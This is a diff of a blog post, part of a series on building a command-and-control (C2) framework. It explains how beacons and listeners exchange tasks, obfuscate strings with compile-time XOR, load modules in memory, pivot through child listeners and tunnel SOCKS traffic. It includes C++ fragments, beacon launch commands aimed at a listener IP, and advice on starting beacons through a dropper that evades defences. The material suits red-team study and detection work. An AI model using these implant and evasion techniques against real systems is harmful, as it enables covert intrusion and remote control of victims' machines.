@@ -1,6 +1,18 @@
-# Part 3 — Beacons & Listeners
+---
+layout: post
+article: true
+title: "Building a Modern C2 - Part 3: Beacons and Listeners"
+date: 2025-10-22
+category: c2
+series: "Building a Modern C2"
+tags: [c2, beacon, listener, transports, smb, tcp, socks]
+description: "The shared runtime contract between beacons and listeners, including transport channels, routing, pivoting, and SOCKS support."
+permalink: /BuildingAModernC2/Part3BeaconsAndListeners.html
+---
 
-## What the Core Guarantees - shared contract
+# Part 3 - Beacons and Listeners
+
+## What the Core Guarantees - Shared Contract
 
 Exploration C2’s core package [**C2Core**](https://github.com/maxDcb/C2Core) defines the runtime contract between listeners and beacons:
 
@@ -17,7 +29,7 @@ Exploration C2’s core package [**C2Core**](https://github.com/maxDcb/C2Core) d
 The C2Core listener is where transport payloads get turned into actionable messages and sessions.
 
 Communication channels are implemented as subclasses of a common `Listener` base.
-Each concrete listener encapsulates the **transport-specific server** and runs its **event loop** on a dedicated worker thread. Below is the HTTP variant: it spins up a small HTTP(S) server, registers the endpoint(s), and forward the queries to `Listener::handleMessages()`.
+Each concrete listener encapsulates the **transport-specific server** and runs its **event loop** on a dedicated worker thread. Below is the HTTP variant: it spins up a small HTTP(S) server, registers the endpoint(s), and forwards the queries to `Listener::handleMessages()`.
 
 
 ```c++
@@ -61,7 +73,7 @@ Compile time encryption:
  *       Use in conjunction with decryption logic at runtime if needed.
  */
 template<std::size_t N, std::size_t M>
-inline constexpr std::array<char, N> compileTimeXOR(const std::string_view data, const std::string_view key) 
+inline constexpr std::array<char, N> compileTimeXOR(const std::string_view data, const std::string_view key)
 {
     std::array<char, N> result{};
     std::size_t key_size = key.size();
@@ -103,7 +115,7 @@ if(isExist==false)
     std::string username = bundleC2Message->username();
     ...
     std::shared_ptr<Session> session = std::make_shared<Session>(listenerhash, beaconHash, hostname, username, arch, privilege, os, internalIps, processId, additionalInformation);
-    
+
     // Sessions managed by this listener
     m_sessions.push_back(std::move(session));
 }
@@ -120,13 +132,13 @@ else
 The listener exposes per-beacon **task queues** and **result queues**:
 
 ```c++
-// Queue taks to send to the related beacon
+// Queue tasks to send to the related beacon
 void Listener::queueTask(const std::string& beaconHash, const C2Message& c2Message)
 {
     addTask(c2Message, beaconHash);
 }
 
-// Add received taks result to a queue used by a consumer
+// Add received task result to a queue used by a consumer
 bool Listener::addTaskResult(const C2Message& taskResult, const std::string& beaconHash)
 {
         for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
@@ -145,11 +157,11 @@ This lets the TeamServer push commands and read back results without coupling to
 
 ### 3) Child listeners per session for pivoting
 
-A pivoting feature give the ability to **register ad-hoc child listeners bound to a beacon session**:
+A pivoting feature gives the ability to **register ad-hoc child listeners bound to a beacon session**:
 
-This mechanism lets a beacon report back “I spun up another listener” (e.g., to accept downstream connections). The code treats these as **child listeners** associated with the parent session. 
+This mechanism lets a beacon report back “I spun up another listener” (e.g., to accept downstream connections). The code treats these as **child listeners** associated with the parent session.
 
-![alt text](media/GraphPanel.png)
+![Graph panel showing child listener relationships](media/GraphPanel.png)
 
 ```c++
 addSessionListener(beaconHash, listenerHash, type, param1, param2);
@@ -168,24 +180,24 @@ addSocksTaskResult(...)
 getSocksTaskResult(...)
 ```
 
-This separation let the TeamServer use a thread to handle the socks traffic sepratly.
+This separation lets the TeamServer use a thread to handle the SOCKS traffic separately.
 
 ---
 
 
 ## Beacon: transports and module execution
 
-The beacon provide multiple transport flavors:
+The beacon provides multiple transport flavors:
 
 * **HTTP/HTTPS**, **TCP**, **SMB**, **DNS**; each comes as a specialized beacon binary (e.g., `BeaconHttp.exe`, `BeaconTcp.exe`, `BeaconSmb.exe`).
 
 Example:
 
-> `BeaconHttp.exe <LISTENER_IP> <LISTENER_PORT> http/https`   
-> `BeaconTcp.exe <LISTENER_IP> <LISTENER_PORT>`   
+> `BeaconHttp.exe <LISTENER_IP> <LISTENER_PORT> http/https`
+> `BeaconTcp.exe <LISTENER_IP> <LISTENER_PORT>`
 > `BeaconSmb.exe <LISTENER_IP> <PIPE_NAME>`
 
-Using command-line arguments in the beacon may look odd from a stealth perspective. In practice, the beacon isn’t meant to be launched manually. Operationally, it should be started by a dropper/loader that handles the initial execution context, passes configuration internally and handle the heat of the local defence. The CLI exists for development, testing, and automation, not for production deployments.
+Using command-line arguments in the beacon may look odd from a stealth perspective. In practice, the beacon isn’t meant to be launched manually. Operationally, it should be started by a dropper/loader that handles the initial execution context, passes configuration internally, and handles local defense pressure. The CLI exists for development, testing, and automation, not for production deployments.
 
 Just like the `Listener`, each beacon implementation relies on the common `Beacon` class for all **task-related logic** (such as queuing, execution, and response handling). This allows each beacon variant to focus solely on **its specific communication channel**.
 
@@ -243,7 +255,7 @@ constructProc construct = (constructProc)MemoryGetProcAddress(handle, reinterpre
 // Call module constructor
 ModuleCmd* moduleCmd = construct();
 
-// Check if the lib is already loaded 
+// Check if the lib is already loaded
 unsigned long long moduleHash = moduleCmd->getHash();
 auto object = std::find_if(m_moduleCmd.begin(), m_moduleCmd.end(),
             [&](const std::unique_ptr<ModuleCmd>& obj){ return obj->getHash() == moduleHash; });
@@ -261,20 +273,20 @@ for (auto& it : config.items())
     }
 }
 
-// Add the module to the list of loaded module for futur use
+// Add the module to the list of loaded modules for future use
 m_moduleCmd.push_back(std::move(moduleCmd_));
 ```
 
-![alt text](media/consolePanel.png)
+![Console panel showing beacon output](media/consolePanel.png)
 
 ---
 
-### 2) The message model 
+### 2) The message model
 
-Message model beacon side is the same as the one implemented listener side:
+The beacon-side message model is the same as the one implemented listener-side:
 
-* **BundleC2Message**: `beaconHash`, `listenerHash`, `username`, `hostname`, `arch`, `privilege`, `os`, `internalIps`, `processId`, `additionalInformation`, `lastProofOfLife`, and a list of **`C2Message`** entries.  
-BundleC2Message are handle by beacons and listeners.
+* **BundleC2Message**: `beaconHash`, `listenerHash`, `username`, `hostname`, `arch`, `privilege`, `os`, `internalIps`, `processId`, `additionalInformation`, `lastProofOfLife`, and a list of **`C2Message`** entries.
+BundleC2Message objects are handled by beacons and listeners.
 
 ```c++
 class BundleC2Message
@@ -322,8 +334,8 @@ bool Beacon::taskResultsToCmd(std::string& output)
 }
 ```
 
-* **C2Message**: carries an `instruction`, plus whatever payload the module/command uses.  
-C2Message are handle by modules.
+* **C2Message**: carries an `instruction`, plus whatever payload the module/command uses.
+C2Message objects are handled by modules.
 
 ```c++
 class C2Message
@@ -340,7 +352,7 @@ private:
     std::string m_returnValue;
     std::string m_inputFile;
     std::string m_outputFile;
-    std::string m_data;    
+    std::string m_data;
     std::string m_args;
     int m_pid;
     int m_errorCode;
@@ -415,7 +427,7 @@ bool Beacon::cmdToTasks(const std::string& input)
 {
     ...
     // Iterate over each BundleC2Message in the multi-bundle message
-    for (int k = 0; k < multiBundleC2Message.bundlec2messages_size(); k++) 
+    for (int k = 0; k < multiBundleC2Message.bundlec2messages_size(); k++)
     {
         BundleC2Message* bundleC2Message = multiBundleC2Message.bundlec2messages(k);
 
@@ -425,13 +437,13 @@ bool Beacon::cmdToTasks(const std::string& input)
         {
             ...
         }
-        // Otherwise, the message is for a session handle by a local listener
+        // Otherwise, the message is for a session handled by a local listener
         else
         {
             // Iterate through all the local listeners
             for(int i=0; i<m_listeners.size(); i++)
             {
-                // Check each session os this local listener
+                // Check each session of this local listener
                 for(std::size_t j=0; j<m_listeners[i]->getNumberOfSession(); j++)
                 {
                     ...
@@ -444,13 +456,13 @@ bool Beacon::cmdToTasks(const std::string& input)
 }
 ```
 
-A new beacon will **connect to this beacon-listener as it would to the TeamServer**. Then the messaging will follow the same path as normal traffic to reach the TeamServer ultimatly. Traffic is bi directional and will also handle the socks5 messages.
+A new beacon will **connect to this beacon-listener as it would to the TeamServer**. Then the messaging will follow the same path as normal traffic to ultimately reach the TeamServer. Traffic is bidirectional and will also handle the SOCKS5 messages.
 
 ---
 
 ### 4) SOCKS beacons
 
-When the socks traffic fanaly reach the target beacon, it will do the requested task and forward the result using the same traffic path.
+When the SOCKS traffic finally reaches the target beacon, it will perform the requested task and forward the result using the same traffic path.
 
 ```c++
 bool Beacon::handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessage)
@@ -479,7 +491,7 @@ bool Beacon::handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessa
         {
             if (m_socksTunnelClient[i]->getId() == c2Message.pid())
             {
-                // Deliver the data to the socket and get the result to be forwarded back to the TeamServer and finaly the tool using the socks server
+                // Deliver the data to the socket and get the result to be forwarded back to the TeamServer and finally to the tool using the SOCKS server
                 std::string dataOut;
                 int res = m_socksTunnelClient[i]->process(c2Message.data(), dataOut);
                 c2RetMessage.set_data(dataOut);
@@ -515,7 +527,7 @@ unloadModule
 
 * `sleep` — adjusts the beacon’s timing/polling interval.
 * `end` — orderly termination.
-* `listener` — listener/session management. 
+* `listener` — listener/session management.
 * `loadModule` — push a module (DLL/SO bytes) and load it **in memory** (MemoryModule).
 * `unloadModule` — remove a previously loaded module.
 
@@ -523,4 +535,4 @@ unloadModule
 
 ## What’s next
 
-[Part 4 — Modules](./Part4Modules.md).  
+- [Part 4 - Modules](./Part4Modules.html)
